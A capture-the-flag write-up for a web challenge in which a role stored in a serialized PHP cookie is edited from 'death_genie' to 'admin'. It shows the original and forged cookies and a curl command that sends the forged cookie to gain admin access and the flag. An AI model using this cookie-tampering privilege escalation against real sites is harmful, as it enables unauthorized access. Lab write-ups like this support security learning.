# Yagami's Portfolio (400 points / 34 solves)

Ryuk has prohibited you from being able to view Light Yagami's Portfolio. To be able to do so, you need to have admin capabilities. You think you can figure out a workaround? Be careful...Its Ryuk we're talking about. He won't let you view any sort of information related to Light Yagami unless you are worthy. Prove your mettle and bypass his through his security checks. Should you be able to view Yagami's Portfolio, then I assure you, you will be very well rewarded and your efforts will not go in vain. All the very best!!

Ryuk is guarding the access to Yagami's Portfolio here at:

http://chall.ycfteam.in:4095/

## Overview

The challenge involves bypassing access controls set by Ryuk to view Light Yagami's portfolio. When accessing the provided URL, the server redirects to a denied.php page, indicating restricted access based on user roles. The goal is to manipulate the session or cookies to gain admin privileges and bypass the restrictions.

## Vulnerability

The web application uses a cookie to track user roles, specifically through the `user` cookie, which stores serialized PHP objects. By modifying the `role` field in the serialized `user` object from `death_genie` to `admin`, it is possible to escalate privileges and gain access to restricted pages.

## Solve

1) Initial Access: Visiting the challenge URL (http://chall.ycfteam.in:4095/) results in an immediate redirection to /denied.php.
2) Cookie Analysis: The browser stores a user cookie with serialized data:

`O:4:"User":2:{s:10:"\0User\0role";s:11:"death_genie";s:4:"name";s:4:"ryuk";}`

The role field contains death_genie, which likely has restricted access.

3) Cookie Modification: The cookie is modified, changing the role from death_genie to admin:

`O:4:"User":2:{s:10:"\0User\0role";s:5:"admin";s:4:"name";s:4:"ryuk";}`

After URL encoding the modified cookie, we can send a curl request to the `/profile.php` endpoint:

`curl -i -b "PHPSESSID=29deb9c444ba74d75272ebae3733a80c; user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A10%3A%22%00User%00role%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22name%22%3Bs%3A4%3A%22ryuk%22%3B%7D" http://chall.ycfteam.in:4095/profile.php
`

`BsidesDehradun{n0t-s0_53cur3_53r1aliz4t10N_eH!}`
